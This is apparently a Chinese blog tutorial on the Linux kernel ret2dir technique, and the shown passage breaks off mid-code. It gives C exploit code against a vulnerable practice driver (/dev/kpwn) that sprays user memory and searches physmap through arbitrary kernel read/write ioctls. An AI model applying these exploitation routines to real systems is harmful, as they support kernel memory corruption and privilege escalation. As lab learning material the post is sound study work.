<p>这里我在手动创建文件系统时遇到了一些问题，由于lib中的命令都是用静态编译的<strong>busybox</strong>链接实现，我一开始是直接利用busybox的list指令列出所有可用的函数，然后全部解析到lib目录中。但是这个list中并不包括 <strong>setuidgid</strong> 这个命令，导致不能成功进入内核，所以还需要手动导一下<strong>setgiduid</strong>，自动化脚本如下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> $(busybox --list); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">ln</span> -sf busybox <span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf busybox setuidgid</span><br></pre></td></tr></table></figure></div>
<p>之后我们可以写一个exp来验证ret2dir手法核心原理，我们的exp先准备好一些交互用的函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loglx</span><span class="params">(<span class="type">char</span> *tag,<span class="type">uint64_t</span> num)</span>&#123;			<span class="comment">//用来打印地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[lx] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %-20s &quot;</span>,tag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: %-#16lx&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span>        </span><br><span class="line">    <span class="type">uint64_t</span> addr;     </span><br><span class="line">    <span class="type">uint64_t</span> size;     </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">&#125;;                     </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_any</span><span class="params">(<span class="type">int</span> fd,u64 size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,ADD_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,READ_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,WRITE_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del_any</span><span class="params">(<span class="type">int</span> fd,u64 addr)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,DEL_ANY,&amp;in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后我们在main函数中先用add_any函数申请一块内存，然后靠着返回的地址在用户态打印出来看看。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308231319166.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232224327.png"
                      class=""
                >
<p>然后我们去查询对应内核版本的内存布局情况，主要用的是<a class="link"   href="https://elixir.bootlin.com/linux" >这个网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，选择对应的版本后进入<code>source/Documentation/x86/x86_64/mm.txt</code>即可查看内存布局（有时候是mm.rst）。这里我用的内核版本是linux-5.15.153，查询到的结果如下，我们kmalloc申请到的内存确实是在<code>direct mapping of all physical memory</code>中的，也就是大家所称为的<strong>physmap</strong>。这里我在调试时喷射的内存在<strong>kmalloc</strong>申请到的内存的更高地址处，这里获取slab分配的地址时其实不用像原文一样进行按位与处理。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232101958.png"
                      class=""
                >
<p>之后就可以进行内存喷射并且搜索内存了，比如有如下exp：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loginfo</span><span class="params">(<span class="type">char</span> *tag)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s] &quot;</span>,tag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loglx</span><span class="params">(<span class="type">char</span> *tag,<span class="type">uint64_t</span> num)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[lx] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %-20s &quot;</span>,tag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: %-#16lx&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span>        </span><br><span class="line">    <span class="type">uint64_t</span> addr;     </span><br><span class="line">    <span class="type">uint64_t</span> size;     </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">&#125;;                     </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_any</span><span class="params">(<span class="type">int</span> fd,u64 size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,ADD_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,READ_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,WRITE_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del_any</span><span class="params">(<span class="type">int</span> fd,u64 addr)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,DEL_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> spray_times 32*32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mp_size 1024*64</span></span><br><span class="line"><span class="type">void</span> *spray[spray_times];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>] &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    loginfo(<span class="string">&quot;searching\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        <span class="type">char</span> *target = <span class="string">&quot;AAAAAAAA&quot;</span>;</span><br><span class="line">        <span class="type">char</span> *dirty = <span class="string">&quot;BBBBBBBB&quot;</span>;</span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = (u64)memmem(buf,<span class="number">0x1000</span>,target,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos)&#123;</span><br><span class="line">            u64 addr_to_change = addr + (pos-(u64)buf);</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>执行exp时有时候会遇到内存不足的问题，由于我们要提高physmap的命中率，所以要尽可能耗尽所有内存进行内存喷射，我们的exp是申请了64MB的内存，我们可以进入内核使用<code>free -h</code>查看<code>available</code>的数值大小，也就是应用程序可用内存。这里我在<strong>run.sh</strong>中设置128M内存时是不够用的，256M内存又搜半天没结果，后面我用150M内存进入内核一下子就碰撞到physmap。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309121624100.png"
                      class=""
                >
<p>但有时候hit时并不是直接到了我们喷射的内存中，而是我们加载到内存中的代码，这样的话我们在每次找到pos时就不要用break退出了，这样就能找到我们实际大量申请的内存。其实还有种更改的方案是自定义一个不需要指定target的类似memmem的函数，这样就不会需要硬编码写target了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309133155698.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309134242679.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memmem替代函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_series</span><span class="params">(<span class="type">char</span> *buf,<span class="type">size_t</span> buflen,<span class="type">char</span> c,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (buf == <span class="literal">NULL</span> || buflen == <span class="number">0</span> || len &gt; buflen || len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buflen;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==c)</span><br><span class="line">            count++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(count==len)</span><br><span class="line">            <span class="keyword">return</span> i-len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后就能一遍找到对应喷射内存，然后我想验证用户空间与内核空间在physmap上的对应关系，这里我尝试了改用户空间的内容再在原来内核空间搜索到的位置来验证，但是却不能正确修改，而是在其它地址位置能找到修改后的内容。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    </span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;raw_slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        </span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        u64 addr_to_change;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = find_series(buf,<span class="number">0x1000</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos!=<span class="number">-1</span>)&#123;</span><br><span class="line">            addr_to_change = addr + pos;</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line">            loginfo(<span class="string">&quot;changing spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">            add_any(fd,<span class="number">0x500</span>,buf);      <span class="comment">//方便打断点</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">                <span class="built_in">memset</span>(spray[i],<span class="string">&#x27;B&#x27;</span>,<span class="number">0x1000</span>);    <span class="comment">// 在用户态修改对应内存</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 查看内核态对应位置内容是否变化</span></span><br><span class="line">            <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">            read_any(fd,addr_to_change,buf,<span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309155512009.png"
                      class=""
                >
<p>但如果是改内核空间的内容，然后在用户态查看内容是否有被修改，就能轻易的验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">x64dump</span><span class="params">(<span class="type">char</span> *buf,<span class="type">uint32_t</span> num)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 =  (<span class="type">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-x64dump-] start : \n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; i!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx &quot;</span>,*(buf64+i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[-x64dump-] end ... \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u64 *<span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        u64 *p = spray[i];</span><br><span class="line">        <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;mp_size/<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p[j]!=<span class="number">0x4141414141414141</span>)&#123;</span><br><span class="line">                loglx(<span class="string">&quot;check change&quot;</span>,(u64)&amp;p[j]);</span><br><span class="line">                <span class="comment">/*x64dump((void *)&amp;p[j],0x20);*/</span></span><br><span class="line">                <span class="keyword">return</span> &amp;p[j];</span><br><span class="line">            &#125;</span><br><span class="line">            j+=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    </span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;raw_slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        </span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        u64 addr_to_change;</span><br><span class="line">        <span class="type">char</span> *dirty = <span class="string">&quot;BBBBBBBBBBBBBBBB&quot;</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = find_series(buf,<span class="number">0x1000</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos!=<span class="number">-1</span>)&#123;</span><br><span class="line">            addr_to_change = addr + pos;</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line"></span><br><span class="line">            write_any(fd,addr_to_change,dirty,<span class="number">0x10</span>);</span><br><span class="line">            u64 *p = check();</span><br><span class="line">            <span class="keyword">if</span> (p!=<span 